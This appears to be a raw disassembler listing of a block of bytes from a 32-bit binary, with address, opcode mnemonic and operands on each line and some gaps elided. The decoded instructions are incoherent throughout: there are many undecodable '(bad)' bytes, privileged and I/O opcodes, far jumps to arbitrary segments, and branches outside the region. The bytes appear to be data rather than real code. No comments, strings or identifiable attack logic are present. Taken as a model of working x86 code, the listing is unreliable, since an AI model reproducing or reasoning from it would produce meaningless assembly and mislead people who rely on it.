  4421d1:	cmp    BYTE PTR [edx+0x1930ccb8],ch
  4421d7:	jnp    0x4421c5
  4421d9:	ja     0x442195
  4421db:	hlt    
  4421dc:	dec    esp
  4421dd:	dec    edx
  4421de:	aaa    
  4421df:	jnp    0x4421d8
  4421e1:	jg     0x442228
  4421e3:	div    DWORD PTR [eax-0x322b93c5]
	...
  442201:	add    BYTE PTR [ebx-0x2c0673e0],dh
  442207:	jle    0x442190
  442209:	xchg   DWORD PTR [ecx],esi
  44220b:	(bad)  
  44220c:	jo     0x442254
  44220e:	sti    
  44220f:	loopne 0x442222
  442211:	add    al,0x71
  442213:	lods   eax,DWORD PTR ds:[esi]
  442214:	or     DWORD PTR [eax],ecx
  442216:	ins    DWORD PTR es:[edi],dx
  442217:	repz add eax,DWORD PTR [eax]
  44221a:	hlt    
  44221b:	call   0xceb01f33
  442220:	xchg   BYTE PTR [eax],al
  442222:	hlt    
  442223:	aas    
  442224:	jbe    0x44226a
  442226:	jae    0x44228f
  442228:	jp     0x4421ff
  44222a:	sti    
  44222b:	cmc    
  44222c:	jae    0x44222e
  44222e:	hlt    
  44222f:	ins    DWORD PTR es:[edi],dx
  442230:	test   cl,al
  442232:	repnz stos BYTE PTR es:[edi],al
  442234:	jbe    0x4422b1
  442236:	jo     0x44223c
  442238:	outs   dx,BYTE PTR ds:[esi]
  442239:	pop    es
  44223a:	cld    
  44223b:	lea    edi,[edi+ecx*4+0x7d16d979]
  442242:	cdq    
  442243:	mov    ebp,DWORD PTR [edi+eax*4+0x45deaffd]
  44224a:	add    DWORD PTR [esi+0x7c],edx
  44224d:	dec    DWORD PTR [eax]
  44224f:	inc    esp
  442250:	jnp    0x442273
  442252:	add    DWORD PTR [edi+0x6c],ecx
  442255:	std    
  442256:	xchg   ebp,eax
  442257:	add    eax,0xaa8807b
  44225c:	out    0x3,eax
  44225e:	sbb    DWORD PTR [edi],esp
  442260:	ins    BYTE PTR es:[edi],dx
  442261:	ret    
  442262:	mov    al,ds:0x3f0e0e
	...
  44227f:	or     al,0xf0
  442281:	out    dx,al
  442282:	and    DWORD PTR ds:0xfa076280,ecx
  442288:	add    al,0xe7
  44228a:	and    ebp,edi
  44228c:	jle    0x4422f9
  44228e:	std    
  44228f:	repz jbe 0x442220
  442292:	out    dx,al
  442293:	push   0xfb08ed7b
  442298:	ficom  WORD PTR [ecx-0x18f44b80]
  44229e:	add    ebx,ecx
  4422a0:	dec    BYTE PTR [eax]
  4422a2:	mov    DWORD PTR [ebp+0x41],esi
  4422a5:	in     eax,dx
  4422a6:	add    esi,esp
  4422a8:	xor    DWORD PTR [ebp+0x647d377a],edx
  4422ae:	lods   al,BYTE PTR ds:[esi]
  4422af:	daa    
  4422b0:	or     esp,DWORD PTR [eax-0x18fb0b83]
  4422b6:	jbe    0x4422ca
  4422b8:	add    bh,BYTE PTR [esi]
  4422ba:	icebp  
  4422bb:	loopne 0x4422fe
  4422bd:	aam    0xfd
  4422bf:	dec    edx
  4422c0:	jmp    esi
  4422c2:	add    esi,esp
  4422c4:	xchg   DWORD PTR [eax+0xd9986],edi
  4422ca:	jo     0x4422c0
  4422cc:	add    al,0x0
  4422ce:	jmp    0x6b3f08bd
  4422d3:	sub    bh,BYTE PTR [ecx+0x4]
  4422d6:	push   ds
  4422d7:	sub    dh,BYTE PTR [ecx+0x73]
  4422da:	imul   ecx,DWORD PTR [ebx+ebx*8],0xda726254
  4422e1:	mov    esp,0x35
	...
  4422fa:	add    BYTE PTR [eax],al
  4422fc:	or     DWORD PTR [ecx-0x34],0x2d
  442300:	mov    ecx,DWORD PTR [ecx-0x34]
  442303:	pushf  
  442304:	mov    eax,0x1afd7d68
  442309:	leave  
  44230a:	push   ecx
  44230b:	jb     0x442293
  44230d:	or     al,0xb1
  44230f:	aas    
  442310:	mul    BYTE PTR [edi]
  442312:	into   
  442313:	ds lahf 
  442315:	ins    DWORD PTR es:[edi],dx
  442316:	shl    DWORD PTR [esp+ebp*2],0x7c
  44231a:	stc    
  44231b:	(bad)  
  44231c:	jae    0x44239c
  44231e:	pop    ebx
  44231f:	mov    ch,0x7d
  442321:	mov    esi,0x7cb5ae00
  442326:	add    al,0xe9
  442328:	test   DWORD PTR [ebx+eax*4],0xb70905c2
  44232f:	jae    0x442329
  442331:	add    al,0x0
  442333:	scas   al,BYTE PTR es:[edi]
  442334:	xor    eax,0xf7e8fd7d
  442339:	add    al,0x83
  44233b:	xchg   bl,al
  44233d:	jge    0x442372
  44233f:	in     al,0xf7
  442341:	add    al,0x7d
  442343:	scas   eax,DWORD PTR es:[edi]
  442344:	mov    edx,0x87f486c4
  442349:	jge    0x4423c6
  44234b:	push   ecx
  44234c:	aas    
  44234d:	jbe    0x442348
  44234f:	jmp    0x633da34b
  442354:	in     eax,dx
  442355:	je     0x442360
  442357:	xchg   esi,eax
  442358:	mov    ebx,0xc9007380
  44235d:	add    ebx,ecx
  44235f:	mov    DWORD PTR [eax],eax
	...
  442379:	dec    eax
  44237a:	xchg   ebp,eax
  44237b:	cmp    DWORD PTR [ebp-0x47],0x66fc4cf7
  442382:	mov    al,0x75
  442384:	or     BYTE PTR [esi-0x7a],dl
  442387:	pop    es
  442388:	test   BYTE PTR [edx],cl
  44238a:	add    eax,0x34460000
  44238f:	clc    
  442390:	cmpxchg bl,ah
  442393:	(bad)  
  442394:	call   FWORD PTR [ebp-0x4]
  442397:	mov    ds:0x14d24,eax
  44239c:	add    BYTE PTR [edx-0x3a],dl
  44239f:	mov    ebx,0xf97ba3b0
  4423a4:	jmp    DWORD PTR [esi+0xd16bbf9]
  4423aa:	add    DWORD PTR [edx+0x10d10],esi
  4423b0:	sub    ecx,DWORD PTR [edx+0x4a]
  4423b3:	ret    
  4423b4:	jle    0x442386
  4423b6:	ins    DWORD PTR es:[edi],dx
  4423b7:	mov    al,0xb4
  4423b9:	jge    0x4423b8
  4423bb:	add    DWORD PTR [eax],eax
  4423bd:	or     eax,0x3bd68317
  4423c2:	mov    eax,0x71258bda
  4423c7:	pop    edi
  4423c8:	or     DWORD PTR [ebp-0x40],ebx
  4423cb:	or     eax,0xaf7bcd00
  4423d0:	cwde   
  4423d1:	and    eax,0x46fff962
  4423d6:	cmp    BYTE PTR [eax+ecx*4],dl
  4423d9:	mov    eax,ds:0x40f879
	...
  4423f6:	cdq    
  4423f7:	jnp    0x4423a8
  4423f9:	cwde   
  4423fa:	in     al,0x61
  4423fc:	stc    
  4423fd:	jmp    DWORD PTR [esi]
  4423ff:	xor    BYTE PTR [ebx+ecx*4],dl
  442402:	pop    ebp
  442403:	jo     0x442386
  442405:	sbb    al,0xf4
  442407:	ins    BYTE PTR es:[edi],dx
  442408:	jbe    0x44239a
  44240a:	push   eax
  44240b:	jl     0x44240a
  44240d:	inc    DWORD PTR [ebp+0x4e]
  442410:	inc    esi
  442411:	inc    DWORD PTR [ebx+0x23fefd5e]
  442417:	push   edx
  442418:	xlat   BYTE PTR ds:[ebx]
  442419:	(bad)
  44241c:	xchg   ebx,eax
  44241d:	mov    edi,DWORD PTR [eax+0x6d628d67]
  442423:	into   
  442424:	inc    esp
  442425:	adc    dh,ah
  442427:	pop    ebp
  442428:	jbe    0x44249d
  44242a:	pop    eax
  44242b:	pop    es
  44242c:	jmp    0x4d16a392
  442431:	jl     0x442421
  442433:	pop    ebp
  442434:	std    
  442435:	popa   
  442436:	daa    
  442437:	add    BYTE PTR [ebx],bl
  442439:	pop    es
  44243a:	test   BYTE PTR [esi],dh
  44243c:	jmp    0x44243d
  44243e:	sub    ebx,DWORD PTR [edi-0x4c]
  442441:	daa    
  442442:	rcl    DWORD PTR [ecx+0x75],0x88
  442446:	pop    eax
  442447:	je     0x442446
  442449:	inc    DWORD PTR [ebx]
  44244b:	jmp    0x4b501d6a
  442450:	xchg   ebp,eax
  442451:	psubb  mm3,QWORD PTR [ebp-0x3]
  442455:	add    BYTE PTR [edx],0x6b
  442458:	jns    0x44241f
	...
  442472:	add    ch,dh
  442474:	pop    ebp
  442475:	std    
  442476:	xor    al,0x61
  442478:	call   0xfffd:0x5d8e83f3
  44247f:	jmp    0x442453
  442481:	ja     0x442433
  442483:	push   edx
  442484:	push   0x4d8bfffd
  442489:	std    
  44248a:	push   esp
  44248c:	push   esi
  44248d:	xchg   BYTE PTR [edi-0x778909d7],al
  442493:	jo     0x4424f0
  442495:	std    
  442496:	(bad)  
  442497:	out    dx,eax
  442498:	add    al,0x32
  44249a:	push   es
  44249b:	or     al,0x4
  44249d:	xchg   edx,eax
  44249e:	jo     0x442504
  4424a0:	lock fadd QWORD PTR [ebx]
  4424a3:	hlt    
  4424a4:	jge    0x44245a
  4424a6:	xchg   edi,eax
  4424a7:	push   ss
  4424a8:	pop    eax
  4424a9:	inc    ebp
  4424aa:	jns    0x4424d8
  4424ac:	std    
  4424ad:	outs   dx,DWORD PTR ds:[esi]
  4424ae:	aas    
  4424af:	nop
  4424b0:	jmp    0x3e7:0x1aac73df
  4424b7:	jno    0x44248d
  4424b9:	cli    
  4424ba:	jns    0x442530
  4424bc:	lods   al,BYTE PTR ds:[esi]
  4424bd:	icebp  
  4424be:	add    esi,esp
  4424c0:	jl     0x4424ad
  4424c2:	bnd js 0x44248e
  4424c5:	add    al,BYTE PTR [ebx]
  4424c7:	lods   al,BYTE PTR ds:[esi]
  4424c8:	sbb    BYTE PTR [esi+0xc],ch
  4424cb:	call   0x723fd44f
  4424d0:	xchg   esp,eax
  4424d1:	xor    dh,ch
  4424d3:	xor    esi,DWORD PTR [ebx+0x5f]
  4424d6:	lock add BYTE PTR [eax],al
	...
  4424ed:	add    BYTE PTR [eax],al
  4424ef:	add    ah,bh
  4424f1:	jg     0x44256a
  4424f3:	inc    edi
  4424f4:	push   es
  4424f5:	add    eax,0x609f78e7
  4424fa:	call   0xf7fa0d2a
  4424ff:	fnstenv [ecx]
  442501:	jmp    0x76be:0xc1799495
  442508:	mov    al,ds:0x847ab6fe
  44250d:	mov    cl,0xd1
  44250f:	add    esi,esp
  442511:	jge    0x44254f
  442513:	mov    BYTE PTR [esi+0x7c],dl
  442516:	pop    edi
  442517:	dec    ebx
  442518:	push   es
  442519:	add    eax,0xeaf398e7
  44251e:	pop    ebp
  44251f:	inc    edi
  442520:	test   cl,dh
  442522:	in     al,dx
  442523:	add    esi,esp
  442525:	jmp    0x3500:0x7d719c95
  44252c:	mov    eax,ds:0xaf07f972
  442531:	mov    edx,0x4f7ffb8
  442536:	std    
  442537:	stos   DWORD PTR es:[edi],eax
  442538:	outs   dx,DWORD PTR ds:[esi]
  442539:	mov    cl,BYTE PTR [eax-0x68d5e6b]
  44253f:	add    al,BYTE PTR [ebp-0x76]
  442542:	push   ebx
  442543:	inc    ebp
  442544:	mov    BYTE PTR [ebp+0x727d7f88],dh
  44254a:	stc    
  44254b:	jbe    0x4425b4
  44254d:	jb     0x442548
  44254f:	jmp    0xb4cba0a0
	...
  44256c:	add    BYTE PTR [edi-0x78],ch
  44256f:	mov    BYTE PTR [ebp+0x49],bl
  442572:	jb     0x44256d
  442574:	ror    BYTE PTR [eax-0x47219f11],cl
  44257a:	xchg   esp,eax
  44257b:	mov    esp,0x8704f7f3
  442580:	xchg   esp,eax
  442581:	arpl   di,sp
  442583:	int3   
  442584:	or     ebp,DWORD PTR [esp+edi*4+0x68ea6007]
  44258b:	(bad)  
  44258c:	lock xchg DWORD PTR [ebp-0x780816ee],ebp
  442593:	push   eax
  442594:	std    
  442595:	add    DWORD PTR [ebp+0x4f7f7b8],0x87e8ed88
  44259f:	inc    ebx
  4425a0:	(bad)
  4425a3:	adc    esp,DWORD PTR [edx-0x10]
  4425a6:	adc    eax,0x8af82185
  4425ab:	nop
  4425ac:	pusha  
  4425ad:	inc    BYTE PTR [eax+eax*1]
  4425b0:	jno    0x4425ae
  4425b2:	sti    
  4425b3:	test   BYTE PTR [ecx-0x4c],bh
  4425b6:	push   ss
  4425b7:	add    cl,ch
  4425b9:	jp     0x4425a8
  4425bb:	jmp    0x4425bd
  4425bd:	int3   
  4425be:	dec    ebp
  4425bf:	or     eax,0xc21f9db1
  4425c4:	mov    ?,bp
  4425c7:	or     BYTE PTR [ebp+0x25],0x94
  4425cb:	push   esp
  4425cc:	or     bh,BYTE PTR ds:0xbc9080
	...
  4425ea:	mov    ds:0x508b0005,eax
  4425ef:	icebp  
  4425f0:	pop    ebp
  4425f1:	mov    DWORD PTR [ebp-0x50],esp
  4425f4:	push   cs
  4425f5:	add    BYTE PTR [ebp+0x66611e2],cl
  4425fb:	mov    cl,0xbc
  4425fd:	or     bl,BYTE PTR [ebp+0x5]
  442600:	pop    esi
  442601:	shl    DWORD PTR [edx-0x2a47fda2],cl
  442607:	push   cs
  442608:	add    BYTE PTR [eax],al
  44260a:	dec    esi
  44260b:	push   esp
  44260c:	icebp  
  44260d:	mov    ebp,edx
  44260f:	inc    esp
  442610:	push   cs
  442611:	add    BYTE PTR [ebp-0x7e],bl
  442614:	mov    BYTE PTR [ebx+eiz*1+0xf830005],bh
  44261b:	test   BYTE PTR [ebx-0x7],bh
  44261e:	sbb    eax,DWORD PTR [ebx]
  442620:	pop    esp
  442621:	mov    DWORD PTR [eax+0x2fd35de1],eax
  442627:	or     BYTE PTR [eax+0x8],0xa4
  44262b:	cmp    al,0xdd
  44262d:	data16 adc al,0x95
  442630:	mov    eax,0x83051d16
  442635:	push   eax
  442636:	and    DWORD PTR [edi-0x80],edi
  442639:	mov    eax,0x88000523
  44263e:	loope  0x442659
  442640:	add    DWORD PTR [ebp-0x4f],0x9
  442644:	pop    eax
  442645:	adc    al,0x66
  442647:	ins    BYTE PTR es:[edi],dx
  442648:	or     eax,0xeb15d8a
	...
  442665:	add    BYTE PTR [eax],al
  442667:	hlt    
  442668:	pop    ebp
  442669:	mov    cl,BYTE PTR [eax-0x4]
  44266c:	in     eax,0x10
  44266e:	or     DWORD PTR [edi-0x32],ebp
  442671:	mov    eax,0x8a5df412
  442676:	jnp    0x442618
  442678:	pop    ebp
  442679:	aad    0x13
  44267b:	gs dec esi
  44267d:	sub    eax,esi
  44267f:	sbb    ch,BYTE PTR [ebx]
  442681:	outs   dx,BYTE PTR ds:[esi]
  442682:	jge    0x44263a
  442684:	int3   
  442685:	mov    edx,DWORD PTR [eax-0x28fb0]
  44268b:	adc    ah,ch
  44268d:	mov    ah,0xb8
  44268f:	jmp    0xfd5c:0x24e6fd5d
  442696:	(bad)  
  442697:	fimul  DWORD PTR [edx]
  442699:	arpl   WORD PTR [edx-0x3],sp
  44269c:	int    0xb4
  44269e:	adc    dh,ah
  4426a0:	pop    ebp
  4426a1:	cmp    BYTE PTR [edi-0x1caeb0a],0x53
  4426a8:	pop    esi
  4426a9:	mov    esi,0xfd5df410
  4426ae:	jl     0x4426ee
  4426b0:	je     0x4426c0
  4426b2:	mov    ebp,ebx
  4426b4:	pop    esp
  4426b5:	std    
  4426b6:	inc    DWORD PTR [ebx]
  4426b8:	das    
  4426b9:	test   DWORD PTR [esi+0x24fd5dfe],edi
  4426bf:	sbb    eax,0x6ff7c8f5
  4426c4:	idiv   BYTE PTR [edi+0x3c5df412]
  4426ca:	leave  
	...
  4426e3:	add    BYTE PTR [edx+0x64b10ec6],cl
  4426e9:	sahf   
  4426ea:	or     al,BYTE PTR [eax]
  4426ec:	hlt    
  4426ed:	hlt    
  4426ee:	shr    bl,1
  4426f0:	pop    edx
  4426f1:	mov    esp,DWORD PTR [edx-0x7b]
  4426f4:	cmp    al,0x66
  4426f6:	xchg   BYTE PTR [ebx-0x28],al
  4426f9:	add    al,0x9
  4426fb:	or     eax,DWORD PTR [esp+ebp*4+0x7bf403f1]
  442702:	aaa    
  442703:	sbb    BYTE PTR [edx-0x7c],dh
  442706:	dec    edi
  442707:	sbb    dh,ah
  442709:	add    al,0x6f
  44270b:	or     bl,ch
  44270d:	jnp    0x442733
  44270f:	push   0x8cdad7b3
  442714:	sub    al,0x19
  442716:	pop    esi
  442717:	int3   
  442718:	sti    
  442719:	jp     0x442792
  44271b:	mov    ebx,0x8be70506
  442720:	call   0x48d88524
  442725:	push   ss
  442726:	out    0x3,eax
  442728:	jns    0x44271b
  44272a:	push   edx
  44272b:	add    ebx,DWORD PTR [ecx+ebx*1]
  44272e:	js     0x442744
  442730:	sbb    bh,BYTE PTR [ebx]
  442732:	leave  
  442733:	push   esp
  442734:	pop    ebp
  442735:	jnp    0x4426d3
  442737:	jnp    0x4427a8
  442739:	fsubr  st,st(4)
  44273b:	jae    0x4427b0
  44273d:	xchg   esp,eax
  44273e:	pop    ebx
  44273f:	sbb    dh,ah
  442741:	add    al,0x5e
  442743:	xlat   BYTE PTR ds:[ebx]
  442744:	dec    edi
  442745:	out    0x5f,al
  442747:	mov    esp,0x0
	...
  442760:	add    BYTE PTR [esi+edx*1-0x19],bh
  442764:	add    edx,DWORD PTR [ecx+0x24]
  442767:	or     DWORD PTR [esp+ebp*2-0xbfc22bc],0x796915e6
  442772:	jl     0x442717
  442774:	sbb    esp,esi
  442776:	add    al,0x41
  442778:	or     ecx,DWORD PTR [esp+ebp*4-0x7]
  44277c:	add    esi,esp
  44277e:	add    ebx,DWORD PTR [esp+edi*2]
  442781:	jnp    0x4427ff
  442783:	sbb    DWORD PTR [ecx],0xfffffff4
  442786:	add    al,0x6e
  442788:	mov    esi,DWORD PTR [eax-0x816ffe9]
  44278e:	out    dx,eax
  44278f:	mov    ebp,0xb7678ac
  442794:	daa    
  442795:	aam    0x87
  442797:	push   ebx
  442798:	(bad)  
  442799:	fld    QWORD PTR [ecx-0x22]
  44279c:	bound  edi,QWORD PTR [edi+0x4c248706]
  4427a2:	jecxz  0x4427aa
  4427a4:	pop    ecx
  4427a5:	jg     0x4427ba
  4427a7:	add    cl,ch
  4427a9:	adc    ch,0x13
  4427ac:	arpl   WORD PTR [edi-0x53],si
  4427af:	adc    ch,cl
  4427b1:	idiv   DWORD PTR [esp+eax*1-0x8]
  4427b5:	push   0xafe8e3c2
  4427ba:	adc    al,BYTE PTR [ebp-0x6f791c2f]
  4427c0:	nop
  4427c1:	fld    QWORD PTR [eax+eax*1]
  4427c4:	jb     0x4427c6
	...
  4427de:	scas   eax,DWORD PTR es:[edi]
  4427df:	push   es
  4427e0:	mov    ch,dl
  4427e2:	add    al,0x88
  4427e4:	nop
  4427e5:	jne    0x4427f4
  4427e7:	add    eax,0x5a626200
  4427ec:	inc    eax
  4427ee:	add    ebx,DWORD PTR [esi-0x1d3e2cf0]
  4427f4:	int3   
  4427f5:	push   es
  4427f6:	jo     0x4427a7
  4427f8:	in     eax,dx
  4427f9:	pusha  
  4427fa:	addr16 mov cl,0x12
  4427fd:	jmp    0x41cb0af9
  442802:	outs   dx,DWORD PTR ds:[esi]
  442803:	adc    eax,DWORD PTR [eax]
  442805:	jmp    0xe9434da8
  44280a:	mul    edx
  44280c:	int3   
  44280d:	retf   
  44280e:	adc    al,BYTE PTR [edi]
  442810:	nop
  442811:	mov    eax,ds:0x6a0004ea
  442816:	mov    cl,0x6f
  442818:	call   0x492115
  44281d:	add    BYTE PTR [edx],al
  44281f:	mov    bh,0x88
  442821:	(bad)  
  442822:	out    0x1,eax
  442824:	add    BYTE PTR [ebx],ch
  442826:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  442827:	jg     0x44286e
  442829:	clc    
  44282a:	push   esi
  44282b:	cmp    DWORD PTR [esi+edx*1-0x30ccfe33],0xb70865f3
  442836:	dec    ebp
  442837:	mov    ebp,0x80cd0001
  44283c:	dec    ebp
  44283d:	in     al,dx
  44283e:	jmp    0x442811
  442840:	(bad)  [ebx+0x0]
	...
  44285a:	add    ch,ah
  44285c:	add    BYTE PTR [ecx+0x2667945],al
  442862:	nop
  442863:	in     eax,0x16
  442865:	add    BYTE PTR [eax],al
  442867:	es pop ecx
  442869:	or     eax,0xeb11d8a
  44286e:	add    BYTE PTR [ebp+0x16110479],bl
  442874:	cmp    al,0xdd
  442876:	add    DWORD PTR [ebp+0x15],edx
  442879:	cmp    DWORD PTR [eax+0x49],0x7a
  44287d:	dec    eax
  44287e:	or     bh,dl
  442880:	cwde   
  442881:	mov    cl,0x16
  442883:	dec    ebp
  442884:	add    DWORD PTR [eax-0x6f859dec],ecx
  44288a:	mov    esp,0x8b00014b
  44288f:	pusha  
  442890:	(bad)  
  442892:	push   edi
  442893:	dec    ecx
  442894:	mov    eax,0x67072a10
  442899:	int3   
  44289a:	out    dx,eax
  44289b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44289c:	push   ebx
  44289d:	icebp  
  44289e:	lea    ecx,[ecx-0x42761005]
  4428a4:	inc    esp
  4428a5:	push   cs
  4428a6:	add    BYTE PTR ds:0xbbfc4d7a,cl
  4428ac:	jg     0x442866
  4428ae:	mov    eax,0xfffd6df4
  4428b3:	psubq  mm4,mm1
  4428b6:	test   BYTE PTR [edi+ebx*4],bh
  4428b9:	pop    es
  4428ba:	add    ah,dh
  4428bc:	ret    
  4428bd:	dec    esp
  4428be:	loope  0x4428c0
	...
  4428d8:	jg     0x4428c0
  4428da:	mov    eax,0xe35df412
  4428df:	push   es
  4428e0:	pushf  
  4428e1:	out    0x12,al
  4428e3:	add    ah,dh
  4428e5:	pop    esi
  4428e6:	shl    bh,1
  4428e8:	jge    0x4428d0
  4428ea:	mov    eax,0x865df412
  4428ef:	mov    BYTE PTR [eax+0x4c],bh
  4428f2:	std    
  4428f3:	push   DWORD PTR [edi-0x60]
  4428f6:	js     0x442975
  4428f8:	lods   eax,DWORD PTR ds:[esi]
  4428f9:	gs sti 
  4428fb:	push   esi
  4428fc:	ins    DWORD PTR es:[edi],dx
  4428fd:	adc    DWORD PTR [eax+0x62],esi
  442900:	mov    eax,0xf4fc4885
  442906:	(bad)  
  442907:	jecxz  0x44291b
  442909:	lea    edi,gs:[eax-0x7b02a216]
  442910:	and    al,0x4a
  442912:	xchg   DWORD PTR [eax-0x2ab54],eax
  442918:	jl     0x442974
  44291a:	adc    al,0x85
  44291c:	mov    ecx,0x5803c1
  442921:	div    esp
  442923:	adc    edi,DWORD PTR [esi-0x12]
  442926:	mov    ebx,0x865df412
  44292b:	dec    eax
  44292c:	in     al,dx
  44292d:	in     eax,0x10
  44292f:	or     DWORD PTR [edi-0x32],ebp
  442932:	mov    eax,0x865df412
  442937:	jnp    0x442951
  442939:	pop    ebp
  44293a:	aad    0x13
	...
  442954:	add    BYTE PTR [ebp+0x4e],ah
  442957:	daa    
  442958:	(bad)  
  442959:	xchg   edx,eax
  44295a:	add    al,0xb6
  44295c:	ins    DWORD PTR es:[edi],dx
  44295d:	xchg   ecx,eax
  44295e:	inc    esi
  44295f:	ror    BYTE PTR [ebx+0x3f9a964],cl
  442965:	hlt    
  442966:	loop   0x4429c7
  442968:	mov    esp,0x3e7133c
  44296d:	fst    DWORD PTR [edi]
  44296f:	inc    ecx
  442970:	push   ecx
  442971:	retf   0xdfe2
  442974:	xchg   ebx,eax
  442975:	pushf  
  442976:	adc    ah,bh
  442978:	add    ebx,DWORD PTR [ecx+0x46]
  44297b:	jmp    0xf403:0xf1a87c8a
  442982:	jg     0x4429a8
  442984:	js     0x442997
  442986:	push   edi
  442987:	pusha  
  442988:	test   edi,0xfdf7b081
  44298e:	lods   eax,DWORD PTR ds:[esi]
  44298f:	ins    DWORD PTR es:[edi],dx
  442990:	add    al,0xf4
  442992:	add    al,0xaa
  442994:	(bad)  
  442995:	stos   DWORD PTR es:[edi],eax
  442996:	pop    es
  442997:	out    0x3,eax
  442999:	hlt    
  44299a:	pop    edi
  44299b:	add    DWORD PTR [ecx],edi
  44299d:	mov    ds:0xf6bae8f1,eax
  4429a2:	add    al,0xe7
  4429a4:	add    esi,DWORD PTR [ebp-0xbfeb13f]
  4429aa:	add    al,0xe7
  4429ac:	push   0x3e2ae00
  4429b1:	hlt    
  4429b2:	add    al,0x2a
  4429b4:	(bad)  
  4429b5:	imul   eax,DWORD PTR [eax],0xffffffe7
  4429b8:	add    eax,DWORD PTR [eax]
	...
  4429d2:	hlt    
  4429d3:	xchg   DWORD PTR [ebx+esi*2+0x6bbc1df8],ebp
  4429da:	std    
  4429db:	xor    DWORD PTR [ebx],0xaa6b3d7a
  4429e1:	frstor [eax+0x70df0c7f]
  4429e7:	cmp    BYTE PTR [ebx],ch
  4429e9:	push   eax
  4429ea:	cmp    BYTE PTR [eax],bh
  4429ec:	add    BYTE PTR [esp+ebp*2+0x33624f58],bl
  4429f3:	add    eax,DWORD PTR [ebp+0x165377]
  4429f9:	jmp    0xd83d3022
  4429fe:	sub    BYTE PTR [ebp+0x51],0x92
  442a02:	test   BYTE PTR [eax+eax*1],0xe9
  442a06:	je     0x442a7a
  442a08:	add    eax,0x84e4c23f
  442a0d:	cdq    
  442a0e:	fnstcw WORD PTR [ecx]
  442a10:	fisub  WORD PTR [edx-0x57]
  442a13:	push   ss
  442a14:	xchg   DWORD PTR [esp+esi*2],ebp
  442a17:	out    0x6,eax
  442a19:	ja     0x4429aa
  442a1b:	pop    ss
  442a1c:	add    cl,ch
  442a1e:	ins    BYTE PTR es:[edi],dx
  442a1f:	xlat   BYTE PTR ds:[ebx]
  442a20:	pop    es
  442a21:	arpl   WORD PTR [ecx-0x53],si
  442a24:	adc    ch,cl
  442a26:	idiv   DWORD PTR [esp+eax*1-0x28]
  442a2a:	test   dh,0x13
  442a2d:	arpl   WORD PTR [ecx-0x816ed4e],cx
  442a33:	jg     0x442aaf
  442a35:	std    
	...
  442a4e:	add    BYTE PTR [edi+edi*4+0x7],bh
  442a52:	jb     0x442a06
  442a54:	outs   dx,BYTE PTR ds:[esi]
  442a55:	mov    ch,bh
  442a57:	lock jg 0x4429ec
  442a5a:	(bad)  
  442a5b:	loope  0x442a61
  442a5d:	add    al,ch
  442a5f:	push   ecx
  442a60:	push   ss
  442a61:	scas   eax,DWORD PTR es:[edi]
  442a62:	fstp   DWORD PTR ds:0xcf1a6243
  442a68:	out    0xbd,eax
  442a6a:	xor    al,0x6e
  442a6c:	xchg   edi,eax
  442a6d:	mov    esp,0x6204f7ff
  442a72:	jo     0x442ae5
  442a74:	lods   eax,DWORD PTR ds:[esi]
  442a75:	adc    ch,cl
  442a77:	neg    DWORD PTR [edi+0xd]
  442a7a:	xchg   DWORD PTR [esp+eiz*2-0x7fdbff9e],esp
  442a81:	mov    eax,0x7b061d16
  442a86:	rcl    DWORD PTR [eax],0x7f
  442a89:	xchg   BYTE PTR [ebx+eax*2-0x1f74fffa],bh
  442a90:	cld    
  442a91:	or     BYTE PTR [esi+0x1769],0xd5
  442a98:	xor    ecx,0x5f56ab0b
  442a9e:	mov    ecx,DWORD PTR [ebp+0x66e2cc66]
  442aa4:	aas    
  442aa5:	or     eax,0x5ded1089
  442aaa:	or     DWORD PTR [ebx-0x57],eax
  442aad:	push   cs
  442aae:	add    ch,bl
  442ab0:	jp     0x442b00
  442ab2:	or     BYTE PTR [eax],al
	...
  442acc:	inc    edi
  442acd:	xchg   DWORD PTR [eax-0x77fa32ea],edi
  442ad3:	add    al,0xbc
  442ad5:	add    BYTE PTR [esi+0x14],dl
  442ad8:	daa    
  442ad9:	xchg   edi,eax
  442ada:	mov    cl,0x16
  442adc:	popf   
  442add:	add    eax,0x7ac17e83
  442ae2:	inc    esi
  442ae3:	or     BYTE PTR [esi],dl
  442ae5:	inc    esp
  442ae6:	cmc    
  442ae7:	mov    BYTE PTR [ecx+0x699682fe],dl
  442aed:	push   ss
  442aee:	add    BYTE PTR [eax],al
  442af0:	mov    WORD PTR [ebx+0xd],cs
  442af3:	mov    cl,0x7d
  442af5:	pop    ss
  442af6:	ret    0xe66
  442af9:	fnstcw WORD PTR [edx-0x3e]
  442afc:	and    BYTE PTR [eax-0x72],bh
  442aff:	mov    esp,0x66000543
  442b04:	aam    0x86
  442b06:	mov    eax,0xe3055d16
  442b0b:	adc    esi,DWORD PTR [ebx-0x2e]
  442b0e:	fbld   TBYTE PTR [esi-0xc]
  442b11:	fs jg  0x442acc
  442b14:	loop   0x442b71
  442b16:	std    
  442b17:	jl     0x442b4e
  442b19:	pop    eax
  442b1a:	mov    WORD PTR [edx-0x2ae98],cs
  442b20:	outs   dx,DWORD PTR ds:[esi]
  442b21:	cwde   
  442b22:	or     eax,0xe176a85
  442b27:	add    ah,dh
  442b29:	fidivr WORD PTR [esp+edi*8]
  442b2c:	ja     0x442b92
  442b2e:	add    DWORD PTR [edx+0x0],edi
	...
  442b49:	stos   BYTE PTR es:[edi],al
  442b4a:	mov    ecx,0xae92d088
  442b4f:	arpl   WORD PTR [ebp+0x438c4a42],ax
  442b55:	call   0x9cd6361a
  442b5a:	dec    eax
  442b5b:	std    
  442b5c:	jmp    FWORD PTR [edi+0x10]
  442b5f:	or     al,0x86
  442b61:	jp     0x442b49
  442b63:	push   cs
  442b64:	add    ah,dh
  442b66:	cmc    
  442b67:	clc    
  442b68:	push   cs
  442b69:	cmc    
  442b6a:	das    
  442b6b:	adc    BYTE PTR [esi+0xed562],al
  442b71:	hlt    
  442b72:	repnz not BYTE PTR [ebx]
  442b75:	jg     0x442b8f
  442b77:	or     al,0x85
  442b79:	cmp    edx,esi
  442b7b:	test   BYTE PTR [ebx+ebp*8],dl
  442b7e:	loop   0x442b0e
  442b80:	mov    esp,0xfefd5dea
  442b85:	sub    DWORD PTR [edx-0x4c],esi
  442b88:	adc    dh,cl
  442b8a:	and    ebx,edi
  442b8c:	int3   
  442b8d:	mov    ebx,ds
  442b8f:	inc    edx
  442b90:	hlt    
  442b91:	jge    0x442b5b
  442b93:	mov    al,0x12
  442b95:	hlt    
  442b96:	pop    ebp
  442b97:	fild   WORD PTR [esi+0xef67a]
  442b9d:	hlt    
  442b9e:	ret    0x6211
  442ba1:	daa    
